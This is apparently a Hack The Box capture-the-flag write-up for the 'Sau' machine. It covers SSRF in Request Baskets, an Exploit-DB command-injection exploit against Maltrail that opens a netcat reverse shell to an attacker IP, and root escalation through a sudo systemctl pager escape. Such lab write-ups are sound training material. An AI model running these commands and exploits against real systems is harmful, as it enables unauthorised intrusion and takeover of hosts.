---
layout: single
title: Sau - Hack The Box
excerpt: "Sau is an easy Linux machine exploiting SSRF in Request Baskets (CVE-2023-27163) to access a vulnerable Maltrail instance. An unauthenticated OS command injection grants a shell as puma, and sudo misconfiguration leads to root."
date: 2024-10-23
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-sau/sau.jpg
  teaser_home_page: true
  icon: /blog/assets/images/hackthebox.webp
categories:
  - WriteUp
---


## Synopsis

Sau is an easy Linux machine featuring a vulnerable instance of **Request Baskets** (CVE-2023-27163), which allows **Server-Side Request Forgery (SSRF)**. Leveraging this vulnerability, we gain access to a **Maltrail** instance vulnerable to **Unauthenticated OS Command Injection**, enabling a reverse shell as the `puma` user. A **sudo misconfiguration** is then exploited to escalate privileges to root.

## Skills Required
- Web enumeration  
- Linux fundamentals  

## Skills Learned
- Exploiting SSRF vulnerabilities  
- Command injection  
- Sudo exploitation  

## Enumeration

### Nmap Scan

ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.224

The scan reveals:
- **Port 22:** OpenSSH  
- **Port 80:** Filtered  
- **Port 55555:** HTTP service (Request Baskets)  


## Exploitation

### Request Baskets SSRF (CVE-2023-27163)
The Request Baskets instance (version 1.2.1) is vulnerable to SSRF via the `/api/baskets/{name}` endpoint. This allows us to enumerate internal services.

1. Create a new basket and configure it to forward requests to our machine:

   nc -lnvp 80
   Set the **Forward URL** to `http://<attacker-IP>` and enable **Proxy Response** and **Expand Forward Path**.

2. Access the basket and observe the response:
   curl http://10.10.11.224:55555/<basket-id>

3. Forward requests to `http://127.0.0.1:80` to discover the **Maltrail** instance running internally.


### Maltrail Command Injection
The Maltrail instance (version 0.53) is vulnerable to **Unauthenticated OS Command Injection**.

1. Download the exploit:
   curl -s https://www.exploit-db.com/download/51676 > exploit.py

2. Start a Netcat listener:
   nc -lnvp 4444

3. Execute the exploit:
   python3 exploit.py <attacker-IP> 4444 http://10.10.11.224:55555/<basket-id>

4. Gain a reverse shell as the `puma` user:
   script /dev/null -c bash
   # Ctrl + z
   stty -raw echo; fg
   # Enter (Return) x2

5. Retrieve the user flag:
   cat /home/puma/user.txt

## Privilege Escalation

### Sudo Misconfiguration
The `puma` user can run `/usr/bin/systemctl status trail.service` as root without a password. This, combined with a vulnerable **Systemd version (245)**, allows privilege escalation.

1. Check sudo permissions:
   sudo -l

2. Exploit the Systemd vulnerability (CVE-2023-26604):
   sudo /usr/bin/systemctl status trail.service

3. When prompted, execute:
   !/bin/bash

4. Gain a root shell and retrieve the root flag:
   cat /root/root.txt

## Conclusion

Sau demonstrates the risks of **SSRF** and **command injection** vulnerabilities. By exploiting these and leveraging a **sudo misconfiguration**, we escalate privileges from a low-privileged user to root. This box highlights the importance of secure configurations and timely patching.

This writeup is concise, structured, and highlights the key steps and vulnerabilities exploited during the penetration test.